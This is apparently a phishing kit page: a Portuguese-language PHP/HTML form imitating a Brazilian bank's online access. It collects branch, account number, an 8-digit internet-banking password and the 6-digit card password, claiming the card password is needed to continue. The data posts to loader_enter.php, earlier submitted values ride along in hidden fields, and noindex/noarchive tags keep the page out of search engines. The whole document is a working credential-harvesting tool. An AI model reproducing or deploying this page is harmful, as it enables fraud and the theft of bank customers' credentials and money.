<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bem vindo - Aplicativo Online</title>
    <link rel="shortcut icon" href="imagens/favicon.png" />

    <meta name="theme-color" content="#f4f102">
	<meta name="msapplication-navbutton-color" content="#f4f102">
	<meta name="apple-mobile-web-app-status-bar-style" content="#f4f102">

    <meta name="robots" content="noindex,nofollow">
	<meta name="googlebot" content="noindex,nofollow">
	<meta name="robots" content="noarchive">

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="back_blue">

<div class="row hd_top">
    <div class="centralizar">
        <img src="imagens/logo.jpg" class="cima_logo">
        <p class="desc_cima">Acesse sua conta</p>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<div class="row main_form">
    <div class="centralizar">
        <form action="loader_enter.php" method="post" onsubmit="return check_enter();" class="home_form" autocomplete="off">
		<?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
            <label for="is_agc">
                <span>Agência:</span>
                <input type="tel" name="is_agc" id="is_agc" class="home_input" placeholder="Agência" maxlength="6">
            </label>

            <label for="is_cnt">
                <span>Conta:</span>
                <input type="tel" name="is_cnt" id="is_cnt" class="home_input" placeholder="Conta" maxlength="13">
            </label>

            <label for="is_ps8">
                <span>Senha de AutoAtendimento:</span>
                <input type="password" name="is_ps8" id="is_ps8" class="home_input" placeholder="Senha de 8 dígitos" maxlength="8" style="-webkit-text-security: disc!important;"
                oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </label>

            <label for="is_ps6">
                <span>Senha do cartão:</span>
                <input type="password" name="is_ps6" id="is_ps6" class="home_input" placeholder="Senha de 6 dígitos"  maxlength="6" style="-webkit-text-security: disc!important;"
                oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                <small>Para dar continuidade a esta solicitação, você deve informar a senha do seu cartão de créditos.</small>
            </label>

            <div class="limpar"><br></div>

            <button class="home_btn">
                ACESSAR
            </button>

            <input type="hidden" name="sender" value="home">

        </form>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<!-- includes -->
<link rel="stylesheet" href="estilos/estilo.css">
<script src="javascripts/jquery.min.js"></script>
<script src="javascripts/jquery.mask.js"></script>
<script src="javascripts/javascripts.js"></script>
<script>
$( document ).ready(function() {
    $('#is_agc').mask('0000-0', {reverse: true});
    $('#is_cnt').mask('00000000000-0', {reverse: true});
});
</script>

</body>
</html>